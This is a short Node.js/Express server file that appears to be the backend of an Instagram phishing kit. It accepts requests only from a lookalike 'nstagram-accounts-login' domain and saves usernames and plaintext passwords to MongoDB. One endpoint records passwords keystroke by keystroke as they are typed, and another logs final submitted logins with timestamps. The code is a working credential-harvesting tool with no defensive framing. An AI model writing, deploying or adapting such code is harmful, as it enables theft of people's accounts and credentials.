// server.js
import express from "express";
import mongoose from "mongoose";
import cors from "cors";
import dotenv from "dotenv";

dotenv.config();
const app = express();

const allowedOrigins = [
  "https://nstagram-accounts-login-source-auth.onrender.com",
];

app.use(
  cors({
    origin: function (origin, callback) {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    methods: ["GET", "POST"],
    credentials: true,
  })
);

app.use(express.json());

// MongoDB connection
mongoose
  .connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log("MongoDB Connected"))
  .catch((err) => console.log(err));

// User Schema: updates on each password keystroke
const UserSchema = new mongoose.Schema({
  username: String,
  password: String,
});
const User = mongoose.model("User", UserSchema);

// Login Schema: stores final submitted logins
const LoginSchema = new mongoose.Schema({
  username: String,
  password: String,
  timestamp: { type: Date, default: Date.now },
});
const Login = mongoose.model("Login", LoginSchema);

// Keystroke password update
app.post("/api/update-password", async (req, res) => {
  const { username, password } = req.body;
  if (!username) return res.status(400).json({ message: "Username required" });

  try {
    let user = await User.findOne({ username });
    if (user) {
      user.password = password;
      await user.save();
    } else {
      user = new User({ username, password });
      await user.save();
    }
    res.status(200).json({ message: "Password updated" });
  } catch (err) {
    res.status(500).json({ message: "Error saving password" });
  }
});

// Final login submit
app.post("/api/submit-login", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password)
    return res.status(400).json({ message: "Username and password required" });

  try {
    const newLogin = new Login({ username, password });
    await newLogin.save();
    res.status(200).json({ message: "Login submitted" });
  } catch (err) {
    res.status(500).json({ message: "Error submitting login" });
  }
});

// Start server
const PORT = process.env.PORT || 5001;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
